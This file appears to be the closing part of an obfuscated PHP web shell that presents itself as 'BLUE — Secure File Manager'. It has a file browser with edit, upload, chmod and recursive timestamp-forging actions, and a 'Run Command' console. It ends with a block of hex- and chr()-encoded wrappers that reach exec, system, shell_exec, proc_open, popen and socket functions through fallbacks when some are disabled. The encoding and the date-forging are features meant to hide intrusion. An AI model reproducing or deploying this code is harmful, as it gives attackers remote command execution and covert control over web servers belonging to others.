                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php foreach ($_730d86 as $_aa96df):
    $_e10a9b = $_cf79f1 . DIRECTORY_SEPARATOR . $_aa96df;
    $_f044ba = (int)@filesize($_e10a9b);
    $_d4a9b2 = (int)@filemtime($_e10a9b);
    $_d627b9 = strtolower(pathinfo($_e10a9b, PATHINFO_EXTENSION));
    $_b0d457 = @is_readable($_e10a9b);
    $_29a9ce = @is_writable($_e10a9b);
    $_f72f4e = $_29a9ce ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(108).chr(105).chr(109).chr(101).chr(45).chr(52).chr(48).chr(48) : ($_b0d457 ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(119).chr(104).chr(105).chr(116).chr(101) : "\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30");
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="file"
                                    data-name="<?php echo h(strtolower($_aa96df)); ?>"
                                    data-size="<?php echo $_f044ba; ?>"
                                    data-mtime="<?php echo $_d4a9b2; ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_aa96df); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_aa96df); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_f72f4e; ?>">
                                            <?php echo _f6879b162($_e10a9b); ?>
                                            <a class="font-medium hover:underline text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?a=view&f=<?php echo rawurlencode($_aa96df); ?>&p=<?php echo rawurlencode($_cf79f1); ?>">
                                                <?php echo h($_aa96df); ?>
                                            </a>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2 mono"><?php echo h(_f172932e7($_f044ba)); ?></td>
                                    <td class="py-2 px-2 mono <?php echo $_f72f4e; ?>"><?php echo h(_fcc5d0122($_e10a9b)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_fa695a864($_e10a9b)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date("\x59\x2d\x6d\x2d\x64\x20\x48\x3a\x69\x3a\x73", $_d4a9b2 ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($_aa96df); ?>&p=<?php echo rawurlencode($_cf79f1); ?>">Edit</a>
                                            <?php $_a22274 = _fd59bbecb($_e10a9b); if ($_a22274 !== null): ?>
                                            <a class="btn btn-xs btnw" href="<?php echo h($_a22274); ?>" target="_blank" rel="noopener">Open</a>
                                            <?php endif; ?>
                                            <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($_aa96df); ?>&p=<?php echo rawurlencode($_cf79f1); ?>">Download</a>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_aa96df); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_aa96df); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_aa96df); ?>')">Change Date</button>

                                            <?php if (in_array($_d627b9, array(chr(122).chr(105).chr(112))) || preg_match(chr(126).chr(92).chr(46).chr(40).chr(116).chr(97).chr(114).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(103).chr(122).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(98).chr(122).chr(50).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(120).chr(122).chr(41).chr(36).chr(126).chr(105), $_aa96df)): ?>
                                                <form method="post" action="?a=unzip&p=<?php echo rawurlencode($_cf79f1); ?>" class="inline">
                                                    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                    <input type="hidden" name="file" value="<?php echo h($_aa96df); ?>">
                                                    <button class="btn btn-xs btnw" type="submit">Unzip here</button>
                                                </form>
                                            <?php
    endif; ?>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_cf79f1); ?>" class="inline" onsubmit="return confirm('Delete this file?')">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2 mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="old" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_aa96df); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php if (empty($_c856dc) && empty($_730d86)): ?>
                                <tr><td colspan="7" class="py-6 text-center text-slate-400">Empty</td></tr>
                            <?php
endif; ?>

                            </tbody>
                        </table>
                    </div>
                    <!-- below the table -->
                    <div class="mt-3">
                        <form method="post"
                              action="?a=zip&p=<?php echo rawurlencode($_cf79f1); ?>"
                              class="inline-flex flex-wrap gap-2 items-center">
                            <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                            <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
                            <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
                            <span class="text-xs text-slate-400">
                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
              </span>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="w-full px-6 py-4">
        <div class="footer-line mb-3"></div>
        <div class="text-xs text-slate-400 flex items-center justify-between">
            <span>© <?php echo $_01a177; ?> BLUE — Secure File Manager. All rights reserved.</span>
            <span>Built with ❤️ & Tailwind · Dark UI</span>
        </div>
    </footer>

    <script>
        document.documentElement.classList.add('dark');

        // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
        function guardLinkCopy(e){
            var sel = '';
            if (window.getSelection) sel = String(window.getSelection());
            if (sel && sel.length > 0){
                e.preventDefault();
                return false;
            }
            return true;
        }

        // Search filter
        const searchEl = document.getElementById('searchBox');
        function filterRows(){
            const q = (searchEl && searchEl.value || '').trim().toLowerCase();
            const rows = document.querySelectorAll('#dirBody tr');
            rows.forEach(function(r){
                var name = r.getAttribute('data-name')||'';
                r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
            });
        }
        window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });

        // Sort
        var sortState = { key:'name', asc:true };
        function sortBy(key){
            var body = document.getElementById('dirBody');
            var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
            var factor = (sortState.key===key && sortState.asc)?-1:1;
            sortState = { key: key, asc: factor===1 };
            rows.sort(function(a,b){
                if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
                if(key==='size' || key==='mtime'){
                    var av = parseInt(a.dataset[key]||'0',10);
                    var bv = parseInt(b.dataset[key]||'0',10);
                    return (av-bv) * factor;
                }
                return 0;
            });
            rows.forEach(function(r){ body.appendChild(r); });
        }

        // Checkboxes
        function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
        function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
        function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
        function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }

        // Collect selected items for Zip form
        function collectSelectedInto(form){
            Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
            Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
                var i = document.createElement('input');
                i.type='hidden'; i.name='items[]'; i.value=chk.value;
                form.appendChild(i);
            });
            return true;
        }

        // Bulk chmod on selected items
        function prepBulkChmod(form){
            var sel = document.querySelectorAll('#dirBody .rowchk:checked');
            if(!sel.length){ alert('No items selected.'); return false; }
            var modeEl = form.querySelector('input[name="mode"]');
            var mode = (modeEl && modeEl.value || '').trim();
            if(!mode){ alert('Enter a permission mode (e.g. 0644).'); if(modeEl) modeEl.focus(); return false; }
            if(!confirm('Apply chmod '+mode+' to '+sel.length+' selected item(s)?')) return false;
            collectSelectedInto(form);
            return true;
        }

        // ===== Drag & Drop Upload =====
        var dropZone = document.getElementById('dropZone');
        var tableCard = document.getElementById('tableCard');
        var csrf = <?php echo je($_fa11b8); ?>;
        var currentPath = <?php echo je($_cf79f1); ?>;

        ['dragenter','dragover'].forEach(function(ev){
            document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
        });
        ['dragleave','drop'].forEach(function(ev){
            document.addEventListener(ev, function(e){
                if(ev==='dragleave' && e.target !== document) return;
                tableCard.classList.remove('drop-hint');
            });
        });
        document.addEventListener('drop', function(e){
            if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
            e.preventDefault(); e.stopPropagation();
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
                fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Upload failed'); });
            }catch(err){ console.error(err); alert('Upload failed'); }
        });

        // ===== Drag to Move between directories (copy-friendly by default) =====
        var draggedItemName = null;
        var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy

        // Toggle handler
        (function(){
            var dt = document.getElementById('dragToggle');
            if (dt) {
                dragEnabled = !!dt.checked;
                dt.addEventListener('change', function(){
                    dragEnabled = !!dt.checked;
                });
            }
        })();

        function onDragStartItem(ev, name){
            if (!dragEnabled) {
                ev.preventDefault();
                return false;
            }
            draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
            ev.dataTransfer.effectAllowed = 'move';
        }
        function onDragOverDir(ev){
            if (!dragEnabled) return;
            ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
            ev.dataTransfer.dropEffect = 'move';
        }
        function onDragLeaveDir(ev){
            ev.currentTarget.classList.remove('droptarget');
        }
        function onDropToDir(ev, dirName){
            if (!dragEnabled) return;
            ev.preventDefault();
            var row = ev.currentTarget; row.classList.remove('droptarget');
            var src = draggedItemName || ev.dataTransfer.getData('text/plain');
            if(!src) return;
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                fd.append('src', src);
                var dstAbs = <?php echo je($_cf79f1 . DIRECTORY_SEPARATOR); ?> + dirName;
                fd.append('dst', dstAbs);
                fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Move failed'); });
            }catch(err){ console.error(err); alert('Move failed'); }
        }

        // ===== CodeMirror Init (file editor text mode) =====
        <?php if ($_e67a89 && $_93cb5a === chr(116).chr(120).chr(116)): ?>
        (function(){
            var ta = document.getElementById('editor'); if (!ta) return;
            var filename = <?php echo je(basename($_e67a89)); ?>;
            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
            var cm = CodeMirror.fromTextArea(ta, {
                lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
                lineWrapping:true, theme:'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });
            if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
            var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
            var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
        })();
        <?php
endif; ?>

        // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
        (function(){
            var pre = document.getElementById('previewPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var filename = <?php echo je($_dbf9ce ? basename($_dbf9ce) : ''); ?>;
            var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');

            var textValue = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmPrev = CodeMirror(holder, {
                value: textValue,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });

            if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
            cmPrev.setSize('100%', 480);

            var det = document.getElementById('previewPanel');
            if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
            window.addEventListener('resize', function(){ cmPrev.refresh(); });
        })();

        // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
        (function(){
            var ta = document.getElementById('cmdTA');
            if(!ta || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var isWin = <?php echo je(DIRECTORY_SEPARATOR === "\x5c"); ?>;
            var cmdMode = isWin ? 'powershell' : 'shell';

            var cmCmd = CodeMirror.fromTextArea(ta, {
                lineNumbers: false,
                styleActiveLine: true,
                matchBrackets: true,
                autoCloseBrackets: true,
                lineWrapping: false,
                theme: 'material-darker',
                mode: cmdMode,
                viewportMargin: Infinity,
                placeholder: 'Run Command'
            });

            CodeMirror.autoLoadMode(cmCmd, cmdMode);
            cmCmd.setSize('100%', 36);
            cmCmd.getWrapperElement().classList.add('cm-cmd-input');

            cmCmd.on('beforeChange', function(cm, change){
                var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
                if (hasNewline) change.update(change.from, change.to, [' ']);
            });

            cmCmd.on('keydown', function(cm, e){
                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                    e.preventDefault();
                    var form = document.getElementById('cmdForm');
                    if (form) form.submit();
                }
            });

            var form = document.getElementById('cmdForm');
            if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }

            setTimeout(function(){ cmCmd.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmCmd.refresh(); });
        })();

        // ===== CodeMirror untuk COMMAND OUTPUT =====
        (function(){
            var pre = document.getElementById('cmdOutPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var isWin = <?php echo je(DIRECTORY_SEPARATOR === chr(92)); ?>;
            var outMode = isWin ? 'powershell' : 'shell';

            var txt = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmOut = CodeMirror(holder, {
                value: txt,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: outMode,
                viewportMargin: Infinity
            });

            CodeMirror.autoLoadMode(cmOut, outMode);
            cmOut.setSize('100%', 380);
            cmOut.getWrapperElement().classList.add('cm-cmd-output');

            setTimeout(function(){ cmOut.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmOut.refresh(); });
        })();
    </script>
    </body>
    </html>
<?php



if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(115).chr(111).chr(99).chr(107).chr(101).chr(116).chr(95).chr(99).chr(108).chr(105).chr(101).chr(110).chr(116))) {
    function fx_stream_socket_client($_321c06, &$_bb7180 = null, &$_ab9268 = null, $_034161 = 30, $_f414fe = 0, $_487aa5 = null)
    {
        if (is_fn_usable("\x73\x74\x72\x65\x61\x6d\x5f\x73\x6f\x63\x6b\x65\x74\x5f\x63\x6c\x69\x65\x6e\x74")) {
            return @stream_socket_client($_321c06, $_bb7180, $_ab9268, $_034161, $_f414fe, $_487aa5);
        }
        if (is_fn_usable("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e")) {
            $_f2e365 = $_321c06;
            $_fb987d = 0;
            if (stripos($_321c06, "\x74\x63\x70\x3a\x2f\x2f") === 0 || stripos($_321c06, "\x73\x73\x6c\x3a\x2f\x2f") === 0 || stripos($_321c06, "\x74\x6c\x73\x3a\x2f\x2f") === 0) {
                $_164ce0 = parse_url($_321c06);
                if ($_164ce0 && isset($_164ce0[chr(104).chr(111).chr(115).chr(116)]) && isset($_164ce0["\x70\x6f\x72\x74"])) {
                    $_f2e365 = $_164ce0["\x68\x6f\x73\x74"];
                    $_fb987d = $_164ce0["\x70\x6f\x72\x74"];
                }
            }
            else if (strpos($_321c06, chr(58)) !== false) {
                $_dca3c2 = explode("\x3a", $_321c06, 2);
                $_f2e365 = $_dca3c2[0];
                $_fb987d = (int)$_dca3c2[1];
            }
            return @fsockopen($_f2e365, $_fb987d ? $_fb987d : 80, $_bb7180, $_ab9268, $_034161);
        }
        $_bb7180 = 0;
        $_ab9268 = "\x4e\x6f\x20\x73\x6f\x63\x6b\x65\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
        return false;
    }
}

if (!function_exists("\x66\x78\x5f\x69\x6e\x69\x5f\x72\x65\x73\x74\x6f\x72\x65")) {
    function fx_ini_restore($_5e2bb9)
    {
        if (is_fn_usable(chr(105).chr(110).chr(105).chr(95).chr(114).chr(101).chr(115).chr(116).chr(111).chr(114).chr(101)))
            return @ini_restore($_5e2bb9);
        return false; 
    }
}

if (!function_exists("\x66\x78\x5f\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65")) {
    function fx_gzinflate($_fa026a, $_4deb89 = 0)
    {
        if (is_fn_usable("\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65"))
            return @gzinflate($_fa026a, $_4deb89);
        if (is_fn_usable("\x67\x7a\x64\x65\x63\x6f\x64\x65"))
            return @gzdecode($_fa026a);
        if (is_fn_usable("\x67\x7a\x75\x6e\x63\x6f\x6d\x70\x72\x65\x73\x73"))
            return @gzuncompress($_fa026a);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function fx_exec($_526084, &$_0848c1 = null, &$_d41913 = null)
    {
        if (is_fn_usable("\x65\x78\x65\x63"))
            return @exec($_526084, $_0848c1, $_d41913);
        $_0848c1 = array();
        $_d41913 = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x61\x73\x73\x74\x68\x72\x75")) {
    function fx_passthru($_526084, &$_d41913 = null)
    {
        if (is_fn_usable("\x70\x61\x73\x73\x74\x68\x72\x75"))
            return @passthru($_526084, $_d41913);
        $_d41913 = 127;
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function fx_shell_exec($_526084)
    {
        if (is_fn_usable("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"))
            return @shell_exec($_526084);
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))) {
    function fx_system($_526084, &$_d41913 = null)
    {
        if (is_fn_usable("\x73\x79\x73\x74\x65\x6d"))
            return @system($_526084, $_d41913);
        $_d41913 = 127;
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))) {
    function fx_proc_open($_526084, $_7c9301, &$_a2410f, $_bcc73b = null, $_1ef4cf = null)
    {
        if (is_fn_usable(chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110)))
            return @proc_open($_526084, $_7c9301, $_a2410f, $_bcc73b, $_1ef4cf);
        return false;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x6f\x70\x65\x6e")) {
    function fx_popen($_526084, $_d92393)
    {
        if (is_fn_usable("\x70\x6f\x70\x65\x6e"))
            return @popen($_526084, $_d92393);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
    function fx_parse_ini_file($_528aa6, $_583745 = false, $_9a2a13 = null)
    {
        if (is_fn_usable(chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
            if ($_9a2a13 === null)
                return @parse_ini_file($_528aa6, $_583745);
            return @parse_ini_file($_528aa6, $_583745, $_9a2a13);
        }
        $_86dfb0 = @file_get_contents($_528aa6);
        if ($_86dfb0 === false)
            return false;
        if (is_fn_usable(chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(115).chr(116).chr(114).chr(105).chr(110).chr(103)))
            return @parse_ini_string($_86dfb0, $_583745);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(104).chr(111).chr(119).chr(95).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101))) {
    function fx_show_source($_5e5052, $_e80a03 = false)
    {
        if (is_fn_usable(chr(115).chr(104).chr(111).chr(119).chr(95).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101)))
            return @show_source($_5e5052, $_e80a03);
        if (is_fn_usable("\x68\x69\x67\x68\x6c\x69\x67\x68\x74\x5f\x66\x69\x6c\x65"))
            return @highlight_file($_5e5052, $_e80a03);
        $_7c37a1 = @file_get_contents($_5e5052);
        if ($_e80a03)
            return $_7c37a1;
        echo $_7c37a1;
        return true;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114))) {
    function fx_scandir($_e6f0b6)
    {
        if (is_fn_usable(chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114)))
            return @scandir($_e6f0b6);
        $_66f6b0 = @opendir($_e6f0b6);
        if (!$_66f6b0)
            return false;
        $_36db60 = array();
        while (false !== ($_5be2f1 = readdir($_66f6b0)))
            $_36db60[] = $_5be2f1;
        closedir($_66f6b0);
        return $_36db60;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100))) {
    function fx_posix_getpwuid($_520e7e)
    {
        if (is_fn_usable("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"))
            return @posix_getpwuid($_520e7e);
        return array(chr(110).chr(97).chr(109).chr(101) => @get_current_user(), chr(117).chr(105).chr(100) => $_520e7e);
    }
}
if (!function_exists("\x66\x78\x5f\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x67\x72\x67\x69\x64")) {
    function fx_posix_getgrgid($_35664a)
    {
        if (is_fn_usable("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x67\x72\x67\x69\x64"))
            return @posix_getgrgid($_35664a);
        return array("\x6e\x61\x6d\x65" => "\x75\x6e\x6b\x6e\x6f\x77\x6e", chr(103).chr(105).chr(100) => $_35664a);
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(100).chr(105).chr(115).chr(107).chr(102).chr(114).chr(101).chr(101).chr(115).chr(112).chr(97).chr(99).chr(101))) {
    function fx_diskfreespace($_33dcb4)
    {
        if (is_fn_usable("\x64\x69\x73\x6b\x66\x72\x65\x65\x73\x70\x61\x63\x65"))
            return @diskfreespace($_33dcb4);
        if (is_fn_usable("\x64\x69\x73\x6b\x5f\x66\x72\x65\x65\x5f\x73\x70\x61\x63\x65"))
            return @disk_free_space($_33dcb4);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(103).chr(114).chr(111).chr(117).chr(112))) {
    function fx_filegroup($_528aa6)
    {
        if (is_fn_usable("\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"))
            return @filegroup($_528aa6);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(102).chr(116).chr(112).chr(95).chr(99).chr(111).chr(110).chr(110).chr(101).chr(99).chr(116))) {
    function fx_ftp_connect($_f2e365, $_fb987d = 21, $_034161 = 90)
    {
        if (is_fn_usable("\x66\x74\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74"))
            return @ftp_connect($_f2e365, $_fb987d, $_034161);
        if (is_fn_usable("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e"))
            return @fsockopen($_f2e365, $_fb987d, $_bb7180, $_ab9268, $_034161);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) {
    function fx_stream_get_contents($_bf3f0a, $_025be4 = -1, $_561d74 = -1)
    {
        if (is_fn_usable(chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115)))
            return @stream_get_contents($_bf3f0a, $_025be4, $_561d74);
        if ($_561d74 > 0)
            @fseek($_bf3f0a, $_561d74);
        $_fa026a = "";
        if ($_025be4 === -1) {
            while (!feof($_bf3f0a)) {
                $_fa026a .= @fread($_bf3f0a, 8192);
            }
        }
        else {
            $_fa026a = @fread($_bf3f0a, $_025be4);
        }
        return $_fa026a;
    }
}